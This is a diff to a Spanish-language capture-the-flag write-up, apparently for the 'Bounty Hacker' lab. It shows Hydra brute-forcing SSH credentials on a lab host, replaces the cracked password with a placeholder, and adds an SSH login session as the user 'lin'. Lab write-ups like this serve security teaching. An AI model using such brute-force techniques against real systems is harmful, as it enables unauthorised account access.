@@ -114,8 +114,18 @@ Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in mi
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-28 18:53:45
 [DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
 [DATA] attacking ssh://10.10.107.126:22/
-[22][ssh] host: 10.10.107.126   login: lin   password: RedDr4gonSynd1cat3
+[22][ssh] host: 10.10.107.126   login: lin   password: (Pass)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-28 18:53:56
 ```
-
+Mediante Hydra logramos conseguir la contraseña para loguearnos por SSH (Port 22).
+Procedemos a conectarnos a la PC de lin:
+```bash
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/BountyHacker]
+└─$ ssh lin@10.10.107.126                                                                  
+The authenticity of host '10.10.107.126 (10.10.107.126)' can't be established.
+ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.107.126' (ECDSA) to the list of known hosts.
+lin@10.10.107.126's password: (UsarPass)
+```
